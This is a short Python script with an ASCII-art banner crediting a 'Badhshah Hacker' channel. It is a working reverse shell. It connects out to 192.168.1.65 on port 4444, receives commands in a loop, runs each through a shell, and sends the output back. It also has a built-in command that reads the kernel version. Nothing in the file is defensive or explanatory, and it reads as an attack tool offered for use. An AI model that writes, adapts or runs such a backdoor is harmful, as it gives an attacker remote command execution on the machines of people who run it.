import socket
import subprocess
import os

s = socket.socket()
s.connect(('192.168.1.65', 4444))
import os,sys,time
os.system('clear')
print("                         ,     \    /      ,")
time.sleep(0.1)
print('''                        / \    )\__/(     / \'''')
time.sleep(0.1)
print('''                       /   \  (_\  /_)   /   \'''')
time.sleep(0.1)
print('   <__________________/_____\__\@  @/___/_____\_________________>')
time.sleep(0.1)
print('    |                          |\../|                          |')
time.sleep(0.1)
print('    |                           \VV/                           |')
time.sleep(0.1)
print('    |                    \033[1;93mOwner:~  Badhshah\033[1;97m                     |')	
time.sleep(0.1)
print('    |                 \033[1;93mAuthor:~ Sachin Shrivastv\033[1;97m                |')
time.sleep(0.1)
print('    |                 \033[1;93mYoutube:~ Badhshah Hacker\033[1;97m                |')
time.sleep(0.1)
print('    |                 \033[1;93mAscli art by:~ Brian Young\033[1;97m               |')
time.sleep(0.1)
print('    |__________________________________________________________|')
time.sleep(0.1)
print('''                  |    /\ /      \\\        \ /\    |''')
time.sleep(0.1)
print('                  |  /   V        ))        V   \  |')
time.sleep(0.1)
print('                  |/     `       //         `     \|')
time.sleep(0.1)
print('''                  `              V''')
print('}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~{')
while True:
	try:
		cmd = s.recv(1024)
		if cmd[:2] == 'cd':
			os.chdir(cmd[3:])
			dir = os.getcwd()
			s.sendall('bacod')
		elif cmd == 'kernel_info':
			results = subprocess.Popen('cat /proc/version', shell=True,
					stdout=subprocess.PIPE, stderr=subprocess.PIPE,
					stdin=subprocess.PIPE)
			results = results.stdout.read() + results.stderr.read()

			s.sendall(results)
	
		else:
			results = subprocess.Popen(cmd, shell=True,
					stdout=subprocess.PIPE, stderr=subprocess.PIPE,
					stdin=subprocess.PIPE)
			results = results.stdout.read() + results.stderr.read()

			s.sendall('\n'+results)
	except (socket.error):
		print('Socket Error\nFrist run  host server')
		os.system('exit')